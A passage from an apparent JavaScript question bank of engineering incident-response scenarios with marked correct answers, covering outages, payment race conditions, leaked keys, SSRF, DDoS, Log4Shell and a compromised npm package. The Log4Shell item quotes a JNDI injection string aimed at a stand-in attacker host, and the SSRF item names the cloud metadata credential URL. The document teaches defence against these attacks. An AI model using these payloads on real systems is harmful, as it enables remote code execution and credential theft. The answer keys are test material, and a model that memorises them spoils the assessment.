                    desc: `Your users report 100% API error rate. All pods show "Running" and "Ready" in kubectl. The load balancer health checks are passing. But every real API request returns 500. Pod logs show "DB connection pool exhausted" and "Redis connection refused". The /health endpoint returns 200 because it only checks if the HTTP server is alive, not if its dependencies are healthy.`,
                      solution: `Fix the health check to perform deep health validation: check database connectivity (SELECT 1), check Redis connectivity (PING), check other critical dependencies. A deep health check returns 503 when any critical dependency is unhealthy, causing Kubernetes readiness probes to remove the pod from the load balancer and liveness probes to restart it. Separate liveness (is the process alive?) from readiness (is it ready to serve traffic?).`,
                        explanation: `Kubernetes probe types: Liveness: "should we restart this pod?" — check for deadlocks, infinite loops. Should be lightweight. Readiness: "should we send traffic to this pod?" — check database, cache, external dependencies. A failed readiness probe removes the pod from Service endpoints (no traffic) without restarting it. Deep health check: GET /health/ready returns {"db": "ok", "redis": "ok"} or 503 with details. /health/live (liveness) can be simpler — just check the process is responsive.`,
                          options: [
                            { label: 'A', title: 'Restart all pods manually to reset the connection state', sub: 'kubectl rollout restart deployment/api-service', isCorrect: false },
                            { label: 'B', title: 'Implement deep health checks that verify DB, Redis, and critical dependencies', sub: '/health/ready: SELECT 1 + PING + dep checks → 503 on failure', isCorrect: true },
                            { label: 'C', title: 'Set Kubernetes liveness probe failure threshold to 1 for faster restarts', sub: 'livenessProbe: failureThreshold: 1 periodSeconds: 5', isCorrect: false },
                            { label: 'D', title: 'Remove health checks entirely and rely on external monitoring', sub: 'Delete livenessProbe and readinessProbe from all deployment specs', isCorrect: false },
                          ]
},

{
  id: 'ENG-WAR-035',
    type: 'War Room',
      badgeClass: 'badge-war',
        title: 'Webhook Delivery Failure (Event Ordering)',
          companies: ['Stripe', 'Shopify'],
            timeEst: '~25 min',
              level: 'Mid',
                status: 'Not Started',
                  realWorldContext: `Stripe's webhook system delivers events asynchronously and explicitly warns that events may be delivered out of order. A payment.succeeded event might arrive before payment.created at the receiving end. Shopify webhooks have similar behavior. Customer checkout systems that assume strict ordering (update order status only on payment.succeeded, expecting payment.created to have already run) break when events arrive out of sequence.`,
                    desc: `Your order management system processes Stripe webhooks. Orders are getting stuck in a "pending payment" state even after customers are successfully charged. Logs show: payment.succeeded webhook processed at 14:00:02, but payment.created webhook processed at 14:00:05 (3 seconds later). Your handler for payment.succeeded tries to update order status, but fails because the order doesn't exist yet — payment.created hadn't been processed yet.`,
                      solution: `Never assume webhook delivery order. For each incoming webhook event, the handler should be idempotent and resilient to out-of-order delivery: (1) when payment.succeeded arrives and the order doesn't exist yet, queue the event for retry. (2) When payment.created arrives, process it and also check if there's a queued payment.succeeded — if so, process it now. Or: make your webhook handler upsert the order from any event, carrying all relevant state.`,
                        explanation: `Webhook ordering guarantees: most webhook systems (Stripe, GitHub, Shopify) explicitly state "we don't guarantee ordering." Design for this: (1) Idempotency: processing the same event twice should be safe (use event IDs to deduplicate). (2) Out-of-order resilience: design handlers to upsert state rather than requiring specific prior state. (3) Retry queues: when an event's dependencies aren't met yet, re-queue with a delay. Stripe's recommendation: look up the object from the API on each webhook rather than trusting only the event payload.`,
                          options: [
                            { label: 'A', title: 'Add a 5-second delay before processing all webhooks to allow ordering', sub: 'Queue all webhooks with a 5-second delay before processing', isCorrect: false },
                            { label: 'B', title: 'Design idempotent handlers with retry queues for out-of-order events', sub: 'Upsert order state on any event; queue for retry if dependencies missing', isCorrect: true },
                            { label: 'C', title: 'Subscribe to all Stripe webhook events and sort by created timestamp before processing', sub: 'Buffer events for 30s, sort by event.created, then process in order', isCorrect: false },
                            { label: 'D', title: 'Switch from webhooks to polling the Stripe API every 10 seconds', sub: 'Cron: poll stripe.charges.list() every 10s', isCorrect: false },
                          ]
},

{
  id: 'ENG-WAR-036',
    type: 'War Room',
      badgeClass: 'badge-war',
        title: 'GraphQL N+1 Behind a Public API',
          companies: ['GitHub', 'Shopify'],
            timeEst: '~25 min',
              level: 'Mid',
                status: 'Not Started',
                  realWorldContext: `GitHub's GraphQL API v4 launched with DataLoader to solve N+1 queries. Without DataLoader, a GraphQL query like {repositories {pullRequests {author {name}}}} would execute 1 query per PR to fetch author data. With 1000 PRs that's 1001 database queries for one API request. GitHub's adoption of DataLoader batched these into 3 queries total.`,
                    desc: `Your GraphQL API is publicly available. A power user sends a query: { users { posts { comments { author { name } } } } }. This innocent-looking query generates 10,000+ database queries per request. Your database CPU hits 100% for every such request. The query is technically valid per your schema. Other users' requests start timing out.`,
                      solution: `Implement DataLoader for all relationship fields to batch and cache database lookups within a single request. Add Query Depth Limiting (max 5 levels deep), Query Complexity Scoring (cost per field), and Rate Limiting per API key. Consider Persisted Queries (only allow pre-approved query shapes) for public APIs. Field-level authorization should also reject overly broad queries.`,
                        explanation: `DataLoader (Facebook's open-source library) solves GraphQL N+1: it collects all "author" lookups needed during a request execution, then fires a single batched query (SELECT * FROM users WHERE id IN (1,2,3,...)) instead of one per comment. Defense in depth for public GraphQL APIs: (1) DataLoader for batching, (2) max query depth limit, (3) query complexity analysis (each field has a cost; reject expensive queries), (4) rate limiting, (5) query timeout.`,
                          options: [
                            { label: 'A', title: 'Add a 10 queries/minute rate limit per API key', sub: 'graphql-rate-limit middleware: max 10 requests/minute', isCorrect: false },
                            { label: 'B', title: 'Implement DataLoader + query depth/complexity limits + rate limiting', sub: 'DataLoader batch + maxDepth:5 + complexity scoring + per-key rate limit', isCorrect: true },
                            { label: 'C', title: 'Disable nested queries in the schema entirely', sub: 'Remove all relationship fields from public GraphQL schema', isCorrect: false },
                            { label: 'D', title: 'Add a Redis cache for all GraphQL query results', sub: 'Cache full query result by SHA256(query+variables) for 60s', isCorrect: false },
                          ]
},

{
  id: 'ENG-WAR-037',
    type: 'War Room',
      badgeClass: 'badge-war',
        title: 'Celery Task Queue Backlog (Worker Starvation)',
          companies: ['Dropbox', 'Instacart'],
            timeEst: '~20 min',
              level: 'Mid',
                status: 'Not Started',
                  realWorldContext: `Dropbox's file sync pipeline uses a task queue system similar to Celery. A high-volume but non-urgent task type ("thumbnail generation") was placed in the same queue as urgent tasks ("send password reset email"). The thumbnail backlog grew to 500k tasks, starving the email tasks which waited hours in queue behind them. Users never received their password reset emails.`,
                    desc: `Your Celery task queue has 500,000 queued tasks. Users are reporting they never received their password reset emails (sent via a Celery task). Celery workers are running but consuming thumbnail generation tasks (each takes 2-5 seconds). Password reset email tasks are buried at position 498,000 in the queue. Time-sensitive tasks are taking hours to be processed.`,
                      solution: `Implement queue prioritization: create separate queues for different task priorities (e.g., 'critical', 'high', 'default', 'low'). Route password reset emails to the 'critical' queue. Route thumbnail generation to the 'low' queue. Start dedicated workers that only consume the 'critical' queue. In Celery: use task_routes to assign tasks to queues and start workers with -Q critical,high flags.`,
                        explanation: `Celery queue design principles: never mix time-sensitive tasks with bulk tasks. Create at least 3 priority queues: critical (auth emails, payment confirmations — dedicated workers, always first), high (notifications, API calls), low (thumbnails, reports, batch jobs). Worker assignment: critical queue: 5 workers dedicated, never process other queues. Low queue: workers can be reduced during resource constraints. Celery: celery worker -Q critical,high --concurrency=10. The "critical" queue workers should never be starved by other queues.`,
                          options: [
                            { label: 'A', title: 'Scale Celery workers to 100 instances to clear the backlog faster', sub: 'kubectl scale deployment celery-worker --replicas=100', isCorrect: false },
                            { label: 'B', title: 'Flush the entire task queue and re-enqueue only password reset tasks', sub: 'celery purge; re-queue critical tasks only', isCorrect: false },
                            { label: 'C', title: 'Implement separate priority queues; dedicate workers to critical queue', sub: 'task_routes: email → critical, thumbnail → low; workers: -Q critical', isCorrect: true },
                            { label: 'D', title: 'Increase Celery task visibility timeout to deprioritize old tasks', sub: 'CELERY_VISIBILITY_TIMEOUT = 3600', isCorrect: false },
                          ]
},

{
  id: 'ENG-WAR-038',
    type: 'War Room',
      badgeClass: 'badge-war',
        title: 'Memory Leak in Long-Running Go Service',
          companies: ['Uber', 'Datadog'],
            timeEst: '~25 min',
              level: 'Senior',
                status: 'Not Started',
                  realWorldContext: `Datadog's agent is written in Go and runs on millions of hosts. A subtle memory leak — goroutines not being properly cleaned up when connections closed — caused memory usage to grow by ~10MB per hour. Over a week, the agent would OOM. The fix required analyzing goroutine stack dumps (SIGQUIT) and pprof heap profiles to identify the leaking goroutines.`,
                    desc: `Your Go microservice processes real-time events and has been running for 5 days. Memory usage has grown from 200MB to 4GB (a perfect linear increase). The K8s pod will OOM-kill in approximately 6 hours. CPU is normal. There are no obvious errors in logs. The service handles 10,000 concurrent WebSocket connections.`,
                      solution: `Capture a pprof heap profile and goroutine profile while memory is high: curl localhost:6060/debug/pprof/heap > heap.prof and curl localhost:6060/debug/pprof/goroutine > goroutine.prof. Analyze with go tool pprof. Look for goroutines blocked on channels with no corresponding reader — these are typical leaks in WebSocket/event-handling code. Common cause: spawning a goroutine to handle a connection but not cleaning it up when the connection closes.`,
                        explanation: `Go goroutine/memory leak patterns: (1) Goroutine leak: a goroutine blocked on a channel read/write with no corresponding operation on the other side — it lives forever. Each goroutine uses ~8KB stack (grows on demand). (2) Map not cleaned: accumulating entries in a global map without eviction. Diagnostic: enable pprof in your service (import _ "net/http/pprof"), check /debug/pprof/goroutine for goroutine counts, /debug/pprof/heap for memory. WebSocket: always defer conn.Close() and cancel context on disconnect.`,
                          options: [
                            { label: 'A', title: 'Increase pod memory limits to 16GB to buy more time', sub: 'resources: limits: memory: 16Gi', isCorrect: false },
                            { label: 'B', title: 'Add a cron job to restart the service every 24 hours', sub: 'K8s CronJob: kubectl rollout restart every night at 2am', isCorrect: false },
                            { label: 'C', title: 'Capture pprof heap+goroutine profiles; identify and fix the goroutine leak', sub: 'curl /debug/pprof/goroutine; go tool pprof; fix defer conn.Close() + ctx cleanup', isCorrect: true },
                            { label: 'D', title: 'Rewrite the service in Rust to avoid garbage collection issues', sub: 'Port Go service to Rust for zero-GC memory management', isCorrect: false },
                          ]
},

{
  id: 'ENG-WAR-039',
    type: 'War Room',
      badgeClass: 'badge-war',
        title: 'Feature Flag Rollout Breaks Dark Launch A/B Test',
          companies: ['LaunchDarkly', 'Facebook'],
            timeEst: '~15 min',
              level: 'Junior',
                status: 'Not Started',
                  realWorldContext: `Facebook ships new features via "dark launches" — the feature is live in code but invisible to users, with metrics collected before a public launch. A common incident: a feature flag meant to show a new checkout UI to 10% of users was accidentally set to 100%. The new (untested-at-scale) checkout UI was shown to all users, causing a 30% conversion drop before the team noticed and rolled back.`,
                    desc: `An engineer pushed a feature flag configuration change intended to roll out a new checkout UI to 10% of users for an A/B test. Due to a YAML misconfiguration, the flag was deployed with rollout_percentage: 100 instead of 10. All users are now seeing the new UI. Conversion rate has dropped 28% in the last 20 minutes. The flag change was pushed 25 minutes ago.`,
                      solution: `Immediately revert the feature flag rollout to 0% (kill switch — show no users the new UI) using the feature flag management dashboard. Do not revert to 10% yet — verify the old UI restores conversion rates first. Then: (1) add a test that validates flag values are in expected ranges before deployment, (2) require 2-person review for any production flag change above 20% rollout.`,
                        explanation: `Feature flag incident response: (1) Kill switch: set rollout to 0% immediately — this is faster than deploying a fix. (2) Verify metrics recover. (3) Investigate root cause. (4) Add guards: schema validation on flag configuration files (if percentage > 50, require approval). Feature flag best practices: (a) phased rollout: 1% → 5% → 20% → 50% → 100% with metric validation at each step. (b) Kill switches for every significant feature. (c) Alerting: if conversion drops > 10% within 10 minutes of a flag change, auto-alert the team.`,
                          options: [
                            { label: 'A', title: 'Roll back the entire application deployment immediately', sub: 'kubectl rollout undo deployment/checkout-service', isCorrect: false },
                            { label: 'B', title: 'Set rollout to 50% as a compromise while investigating', sub: 'LaunchDarkly: Edit flag → rollout_percentage: 50', isCorrect: false },
                            { label: 'C', title: 'Set rollout to 0% (kill switch) immediately; verify recovery; then fix validation', sub: 'Flag: rollout_percentage: 0; add YAML schema validation + approval gates', isCorrect: true },
                            { label: 'D', title: 'Wait 30 more minutes to collect more A/B test data before deciding', sub: 'Continue monitoring; need more statistical significance', isCorrect: false },
                          ]
},

{
  id: 'ENG-WAR-040',
    type: 'War Room',
      badgeClass: 'badge-war',
        title: 'Race Condition in Distributed Payment Processing',
          companies: ['Stripe', 'PayPal'],
            timeEst: '~30 min',
              level: 'Senior',
                status: 'Not Started',
                  realWorldContext: `A classic distributed systems bug: two concurrent requests to "use loyalty points for purchase" both check available points simultaneously, both see 500 points available, both approve the purchase, and both deduct 500 points — leaving the account at -500 points. Without proper database-level locking, this race condition allows users to spend the same resource twice. Stripe documents this as a common pitfall in payment systems.`,
                    desc: `Your loyalty points redemption system has a bug: some customers have negative point balances (e.g., -500 points). Customer support confirms these customers didn't cheat — they appear to have made two rapid simultaneous purchases that both used the same points. The application code checks: if user.points >= purchase_cost: user.points -= purchase_cost but doesn't lock the row during the check-then-act.`,
                      solution: `Use a database-level lock or atomic update to prevent the race condition. In SQL: replace the check-then-act pattern with an atomic conditional update: UPDATE users SET points = points - $cost WHERE user_id = $id AND points >= $cost. If rows_affected == 0, the deduction failed (insufficient points). This is atomic at the database level — no two concurrent transactions can both succeed if only enough points exist for one.`,
                        explanation: `TOCTOU (Time of Check to Time of Use) race condition: you check a condition, then act on it, but the condition can change between check and act if another process runs concurrently. Database-level fix (most reliable): atomic conditional UPDATE. ORM equivalents: User.update_all("points = points - #{cost}", "id = #{id} AND points >= #{cost}"). Alternative: SELECT FOR UPDATE (pessimistic lock) — but this holds a lock and reduces throughput. For distributed systems: use idempotency keys + database unique constraints to prevent double-spending.`,
                          options: [
                            { label: 'A', title: 'Add a mutex (in-process lock) around the points deduction code', sub: 'threading.Lock() or sync.Mutex around: check_points + deduct_points', isCorrect: false },
                            { label: 'B', title: 'Add a Redis distributed lock (SETNX) around the points operation per user', sub: 'redis.set(f"lock:user:{id}", 1, nx=True, ex=5)', isCorrect: false },
                            { label: 'C', title: 'Use atomic conditional database UPDATE: SET points = points - cost WHERE points >= cost', sub: 'UPDATE users SET points=points-$cost WHERE id=$id AND points>=$cost; check rows_affected', isCorrect: true },
                            { label: 'D', title: 'Process all point redemptions in a single-threaded queue', sub: 'Serialize all redemption requests through a single worker', isCorrect: false },
                          ]
},

// ─────────────────────────────────────────────────────────
//  BATCH D: Security & Compliance (WAR-041 – WAR-045)
// ─────────────────────────────────────────────────────────

{
  id: 'ENG-WAR-041',
    type: 'War Room',
      badgeClass: 'badge-war',
        title: 'GitHub Secret Exposed in Public Repository',
          companies: ['GitHub', 'Twilio'],
            timeEst: '~20 min',
              level: 'Junior',
                status: 'Not Started',
                  realWorldContext: `GitHub's secret scanning alerts and Twilio's security team have documented hundreds of incidents where API keys were accidentally committed to public GitHub repositories. Once pushed to a public repo, the secret should be considered fully compromised — bots scan GitHub in real-time and can use the secret within seconds of the commit. Rotating the secret is mandatory, and git history must be cleaned.`,
                    desc: `An engineer accidentally committed a file containing your production Stripe secret key (sk_live_...) to a public GitHub repository 30 minutes ago. GitHub's secret scanning sent an alert. The commit has already been pushed to the main branch. The Stripe key has full read/write access to all payment data. What do you do RIGHT NOW?`,
                      solution: `Step 1 (immediate, before anything else): Rotate the Stripe API key in the Stripe dashboard. This invalidates the exposed key — any attacker using it immediately loses access. Step 2: Audit Stripe logs for any unauthorized API calls in the last 30 minutes. Step 3: Remove the secret from git history using git filter-repo or BFG Repo Cleaner and force-push. Step 4: Add the secret to .gitignore and move to a secrets manager.`,
                        explanation: `Key rotation MUST happen FIRST — before cleaning git history, before writing incident reports. Every second the key is valid is a risk window. Rotation sequence: (1) Stripe Dashboard → API Keys → Roll Secret Key (immediate invalidation). (2) Update secret in AWS Secrets Manager / HashiCorp Vault. (3) Redeploy application with new key. (4) Clean git history (this is cosmetic after rotation — the key is already dead). (5) Enable GitHub secret scanning alerts. (6) Require pre-commit hooks that scan for secrets (git-secrets, detect-secrets).`,
                          options: [
                            { label: 'A', title: 'Delete the commit and force-push to remove the secret from history', sub: 'git reset HEAD~1 && git push --force origin main', isCorrect: false },
                            { label: 'B', title: 'Make the repository private immediately to hide the secret', sub: 'GitHub: Settings → Change visibility → Private', isCorrect: false },
                            { label: 'C', title: 'Immediately rotate the Stripe key, then audit logs, then clean git history', sub: 'Stripe: Roll API key NOW → audit logs → git filter-repo', isCorrect: true },
                            { label: 'D', title: 'Contact GitHub support to remove the commit from their servers', sub: 'Submit GitHub DMCA/security takedown for the commit', isCorrect: false },
                          ]
},

{
  id: 'ENG-WAR-042',
    type: 'War Room',
      badgeClass: 'badge-war',
        title: 'SSRF Attack Through User-Provided Image URL',
          companies: ['GitLab', 'Confluence'],
            timeEst: '~25 min',
              level: 'Senior',
                status: 'Not Started',
                  realWorldContext: `GitLab had a critical SSRF (Server-Side Request Forgery) vulnerability where the wiki's image import feature allowed attackers to make the GitLab server fetch arbitrary URLs — including internal AWS EC2 metadata endpoint (http://169.254.169.254/latest/meta-data/iam/security-credentials/) to steal IAM credentials. This is a CVSS 10.0 critical vulnerability class.`,
                    desc: `Your platform allows users to embed images by URL. Security monitoring flagged a series of requests where a user is submitting image URLs like http://169.254.169.254/latest/meta-data/iam/security-credentials/. Your backend is fetching these URLs server-side to proxy/validate images. The attacker is attempting SSRF (Server-Side Request Forgery) to read AWS EC2 instance metadata and potentially steal IAM credentials.`,
                      solution: `Block the SSRF immediately: (1) Add URL allowlist validation — only permit HTTPS URLs to known CDN domains. (2) Block all private/internal IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16) before making any HTTP request. (3) Enable AWS IMDSv2 (token-required metadata) on all EC2 instances — this blocks SSRF attacks against the metadata endpoint. Audit logs to check if any successful SSRF responses contained credential data.`,
                        explanation: `SSRF allows attackers to make your server issue HTTP requests to internal services. The AWS metadata endpoint (169.254.169.254) is the most dangerous SSRF target — it returns IAM role credentials that grant cloud access. Defense: (1) URL validation: parse URL, resolve hostname to IP, block private ranges before requesting. (2) Use a separate network-isolated fetching service (network policy: no access to RFC1918 ranges). (3) Enable IMDSv2 (PUT request required before GET) — mitigates SSRF against metadata endpoint. (4) Use pre-signed S3 URLs so users upload directly to S3, not through your server.`,
                          options: [
                            { label: 'A', title: 'Disable the image URL embedding feature entirely until fixed', sub: 'Remove image URL field from all forms; ship hotfix', isCorrect: false },
                            { label: 'B', title: 'Block private IP ranges in URL validation + enable IMDSv2 + audit credential exposure', sub: 'Block 169.254.x.x, 10.x.x.x, 172.16-31.x.x; aws ec2 modify-instance-metadata-options --http-tokens required; audit CloudTrail', isCorrect: true },
                            { label: 'C', title: 'Add rate limiting on the image URL feature to slow down attacks', sub: '10 image URL requests per minute per user', isCorrect: false },
                            { label: 'D', title: 'Require users to submit image URLs only from approved domains', sub: 'Allow only imgur.com, cloudinary.com, s3.amazonaws.com', isCorrect: false },
                          ]
},

{
  id: 'ENG-WAR-043',
    type: 'War Room',
      badgeClass: 'badge-war',
        title: 'DDoS Amplification Attack Exhausting Bandwidth',
          companies: ['Cloudflare', 'AWS Shield'],
            timeEst: '~20 min',
              level: 'Senior',
                status: 'Not Started',
                  realWorldContext: `A memcached DDoS amplification attack in 2018 set a record at 1.7 Tbps, targeting GitHub. The attack exploited misconfigured public-facing memcached servers — a single UDP packet could be amplified 51,000x. GitHub survived because they had Akamai Prolexic DDoS scrubbing in place. AWS Shield Advanced protects against similar volumetric attacks.`,
                    desc: `Your platform is under a DDoS attack. Incoming traffic is 800 Gbps — your upstream bandwidth is 10 Gbps. The attack is volumetric (UDP flood) and is completely saturating your network uplink before traffic even reaches your servers. Your own firewall can't block it — by the time packets reach your firewall, the pipe is already full. Internal services are unreachable. Customer-facing APIs are completely down.`,
                      solution: `A volumetric DDoS at 800 Gbps cannot be mitigated by your own infrastructure — it must be absorbed upstream. Immediately contact your DDoS scrubbing provider (Cloudflare Magic Transit, AWS Shield Advanced, Akamai Prolexic) to activate DDoS scrubbing. This routes your traffic through their scrubbing centers (with 100+ Tbps capacity) which filter attack traffic before forwarding clean traffic to your servers.`,
                        explanation: `Volumetric DDoS exceeds your bandwidth before packets reach your servers. You cannot block what you cannot receive. Solutions: (1) DDoS scrubbing services (Cloudflare Magic Transit, AWS Shield Advanced) absorb attacks at their massive global network. (2) Anycast routing: distribute your IP space across many PoPs so the attack is diluted globally. (3) BGP blackhole: as a last resort, your upstream ISP can null-route your IP (you go dark but the attack traffic is dropped). Prevention: never expose memcached/DNS/NTP services to the public internet (common amplification vectors).`,
                          options: [
                            { label: 'A', title: 'Add iptables rules on all servers to block the attacking IP addresses', sub: 'iptables -A INPUT -s <attack_src_ip> -j DROP', isCorrect: false },
                            { label: 'B', title: 'Activate DDoS scrubbing service (Cloudflare Magic Transit / AWS Shield Advanced)', sub: 'Contact Cloudflare/Akamai/AWS: activate BGP-based scrubbing for your IP prefixes', isCorrect: true },
                            { label: 'C', title: 'Increase server count from 50 to 500 to absorb the extra traffic', sub: 'Auto-scale: aws autoscaling set-desired-capacity --desired-capacity 500', isCorrect: false },
                            { label: 'D', title: 'Change all DNS records to new IP addresses to escape the attack', sub: 'aws route53 change-resource-record-sets to new IP range', isCorrect: false },
                          ]
},

{
  id: 'ENG-WAR-044',
    type: 'War Room',
      badgeClass: 'badge-war',
        title: 'Log4Shell Zero-Day in Production JVM Services',
          companies: ['Apple', 'Amazon', 'Minecraft'],
            timeEst: '~30 min',
              level: 'Senior',
                status: 'Not Started',
                  realWorldContext: `The Log4Shell vulnerability (CVE-2021-44228) disclosed in December 2021 affected virtually every Java application using Log4j 2.x. Attackers could achieve Remote Code Execution by sending a malicious string like \${jndi: ldap://attacker.com/a} in any logged field (User-Agent, username, etc.). Cloudflare saw exploitation attempts within hours of disclosure. Amazon, Apple, Minecraft, and thousands of others were affected.`,
  desc: `It's December 10, 2021. A critical 0-day (Log4Shell) is publicly disclosed affecting Log4j 2.x. Your company runs 40+ Java microservices using Spring Boot (which bundles Log4j). Scanners show exploitation attempts hitting your login endpoint's User-Agent field. You need to: identify which services are affected, mitigate the vulnerability, and patch — all before attackers successfully exploit your services.`,
    solution: `Immediate mitigation (before patching, which takes time): set the JVM system property log4j2.formatMsgNoLookups=true or set the environment variable LOG4J_FORMAT_MSG_NO_LOOKUPS=true in all Java services. This disables the JNDI lookup feature without requiring a code change or redeploy of the JAR. Then: audit all services for Log4j 2.x usage (check pom.xml/build.gradle), patch to Log4j 2.17.1+, and add WAF rules to block \${jndi: patterns.`,
    explanation: `Log4Shell attack vector: when Log4j logs a string containing \${jndi: ldap://attacker.com/x}, it makes an outbound LDAP request to the attacker's server, which responds with Java class bytecode that executes on your JVM. Full mitigation chain: (1) Immediate: LOG4J_FORMAT_MSG_NO_LOOKUPS=true (env var, no restart needed on many platforms). (2) Short-term: WAF rules blocking \${jndi: in all inputs. (3) Patch: upgrade to Log4j 2.17.1+ (earlier 2.16.0 patch was incomplete). (4) Audit: log4j-detector tool scans JARs including nested JARs in fat JARs.`,
    options: [
      { label: 'A', title: 'Block all outbound HTTP/LDAP traffic from servers immediately', sub: 'iptables -A OUTPUT -p tcp --dport 389 -j DROP (LDAP)', isCorrect: false },
      { label: 'B', title: 'Patch all 40+ services to Log4j 2.17.1 and redeploy immediately', sub: 'Update pom.xml: log4j.version=2.17.1; mvn package; deploy all', isCorrect: false },
      { label: 'C', title: 'Set LOG4J_FORMAT_MSG_NO_LOOKUPS=true immediately; audit; patch to 2.17.1; add WAF rules', sub: 'Env var mitigation NOW → scan all JARs → patch → WAF rule blocking ${jndi:', isCorrect: true },
      { label: 'D', title: 'Rewrite all Java services in Python to eliminate Log4j dependency', sub: 'Immediate language migration to avoid JVM vulnerability', isCorrect: false },
    ]
  },

  {
    id: 'ENG-WAR-045',
      type: 'War Room',
        badgeClass: 'badge-war',
          title: 'Supply Chain Attack via Compromised NPM Package',
            companies: ['GitHub', 'Sonatype'],
              timeEst: '~25 min',
                level: 'Senior',
                  status: 'Not Started',
                    realWorldContext: `The ua-parser-js npm package (used by millions of projects including Facebook, Microsoft, and Google) was compromised in October 2021 — attackers published malicious versions that installed a crypto miner and a password stealer. Any project running npm install that accepted the latest version got the malware. GitHub's dependency scanning (Dependabot) flagged the issue, but many teams auto-merged dependency updates.`,
                      desc: `GitHub Security Advisory alerts triggered 30 minutes ago: a widely-used npm package (event-stream equivalent) in your dependency tree was compromised — the latest version contains a crypto miner and credential harvester. npm install would have fetched this version. CI/CD ran 2 hours ago and deployed builds that include this package. The malicious code runs during the build and during application startup.`,
                        solution: `(1) Immediately rotate all secrets the compromised systems had access to (API keys, database credentials, CI/CD secrets — the malware targets these). (2) Roll back to the last known-good deployment (before the malicious npm package was included). (3) Lock the compromised package version in package-lock.json to the last safe version. (4) Scan all build artifacts and running systems for indicators of compromise (the miner/harvester processes). (5) Enable npm package signatures verification and lock all transitive dependencies.`,
                          explanation: `Supply chain attacks target the build pipeline — your application becomes the delivery vehicle for malware. Response: (1) Rotate secrets FIRST (the harvester may have already exfiltrated them). (2) Roll back deployed artifacts. (3) Audit CI/CD logs for the malware's fingerprint. Prevention: (a) npm ci instead of npm install (uses locked package-lock.json, prevents version drift). (b) Require package signature verification. (c) Private npm registry (Artifactory, Verdaccio) as a mirror with manual approval for new package versions. (d) Never auto-merge dependency update PRs to production without review.`,
                            options: [
                              { label: 'A', title: 'Remove the compromised package from package.json and redeploy', sub: 'npm uninstall compromised-package && npm install && deploy', isCorrect: false },
                              { label: 'B', title: 'Rotate all secrets, roll back deployment, lock package version, scan for compromise', sub: 'Rotate secrets → rollback → package-lock.json pin → IOC scan → forensics', isCorrect: true },
                              { label: 'C', title: 'Run npm audit fix to automatically patch the compromised package', sub: 'npm audit fix --force', isCorrect: false },
                              { label: 'D', title: 'Block all outbound network traffic from application servers', sub: 'iptables -P OUTPUT DROP', isCorrect: false },
                            ]
  },

  // ─────────────────────────────────────────────────────────
  //  BATCH E: Observability & SRE Practice (WAR-046 – WAR-055)
  // ─────────────────────────────────────────────────────────

  {
    id: 'ENG-WAR-046',
      type: 'War Room',
        badgeClass: 'badge-war',
          title: 'Alert Fatigue Masks a Real Outage',
            companies: ['PagerDuty', 'Datadog'],
              timeEst: '~15 min',
                level: 'Mid',
                  status: 'Not Started',
                    realWorldContext: `A documented incident pattern at multiple FAANG companies: the on-call engineer receives 500+ alerts during a deployment (normal, expected noise from rolling restarts). Mixed within those 500 alerts is the critical alert: "database connection pool exhausted." The engineer, fatigued by the noise, acknowledges all alerts without reading them. The real issue goes undetected for 45 minutes until users start calling.`,
                      desc: `Your on-call engineer received 500 PagerDuty alerts during a deployment at 2am. They acknowledged them in bulk ("these are just deployment noise"). Hidden in those 500 alerts was: "Payment Service: Database connection pool exhausted (severity: critical)". Payments have been failing for 45 minutes. The engineer assumed all alerts were deployment-related. How do you prevent this from happening again?`,
                        solution: `Implement alert severity tiering and smart grouping: (1) P0/P1 critical alerts (payments, auth, data loss) should page via a separate channel with a distinctive ring (different sound, auto-calls). (2) Deployment-phase alerts should be automatically suppressed or grouped into a single "deployment noise" bundle. (3) Require specific acknowledgment (not bulk) for P0 alerts. (4) Implement alert correlation — if 10 alerts fire during a deployment window, group them; but always surface P0s separately.`,
                          explanation: `Alert fatigue is one of the most dangerous SRE problems. Solutions: (1) Alert tiers: P0 (customer-facing, data loss) → page with phone call. P1 (degraded service) → paging. P2 (warning) → Slack/email. P3 (info) → dashboards only. (2) Deployment suppression windows: maintenance windows automatically suppress P2/P3 alerts. (3) Alert grouping: correlated alerts from the same deployment grouped into one incident, except P0s which always surface. (4) Alert quality reviews: track alert-to-action ratio. If more than 50% of alerts are acknowledged without action, the alert is wrong.`,
                            options: [
                              { label: 'A', title: 'Reduce the total number of alerts to below 50 by removing non-critical ones', sub: 'Delete all alerts with < 100% customer impact', isCorrect: false },
                              { label: 'B', title: 'Implement severity tiering, deployment suppression windows, and mandatory P0 acknowledgment', sub: 'P0 alerts: phone call + mandatory individual ACK; suppress P2/P3 during deploy', isCorrect: true },
                              { label: 'C', title: 'Assign a second on-call engineer to review all alerts during deployments', sub: 'Require 2 on-call engineers for all production deployments', isCorrect: false },
                              { label: 'D', title: 'Migrate from PagerDuty to a different alerting system', sub: 'Evaluate OpsGenie, VictorOps as PagerDuty replacements', isCorrect: false },
                            ]
  },

  {
    id: 'ENG-WAR-047',
      type: 'War Room',
        badgeClass: 'badge-war',
          title: 'Cardinality Explosion Kills Prometheus',
            companies: ['Grafana', 'SoundCloud'],
              timeEst: '~25 min',
                level: 'Senior',
                  status: 'Not Started',
                    realWorldContext: `SoundCloud created Prometheus and documented early production incidents with metric cardinality. A common issue: adding a user_id label to a metric. Instead of 1 time series per metric, you now have 10 million time series (one per user). Prometheus's memory usage explodes, it falls behind on scraping, and eventually OOM-kills. Grafana Cloud's engineering blog documents this as the #1 Prometheus production incident.`,
                      desc: `A developer added a label user_id to a request latency metric: http_request_duration_seconds{user_id="...", endpoint="/api/orders"}. With 5 million users, this created 5 million × 50 endpoints = 250 million time series in Prometheus. Prometheus memory usage jumped from 4GB to 60GB in 2 hours. Prometheus is now OOM-killing, losing all scraped data. Grafana dashboards show gaps.`,
                        solution: `Immediately remove the high-cardinality user_id label from the metric definition and redeploy the instrumented service. Prometheus will stop receiving the cardinality explosion on next scrape. The existing high-cardinality series will be gradually garbage-collected as they go stale (default: 5 minutes). Add cardinality guards: use recording rules to pre-aggregate, and use metric_relabel_configs to drop high-cardinality labels at the scraper level.`,
                          explanation: `Prometheus cardinality: each unique combination of label values = one time series. High-cardinality labels (user_id, request_id, session_id, IP address) create millions of series. Rule of thumb: any label value with unbounded or high cardinality (> 100 unique values) should never be a label. What to do instead: record per-user metrics in a database (PostgreSQL, ClickHouse) for user-level analytics. Prometheus is for system-level (per-service, per-endpoint, per-status-code) metrics. Detection: use prometheus TSDB analyzer or Grafana's cardinality browser to find offending metrics.`,
                            options: [
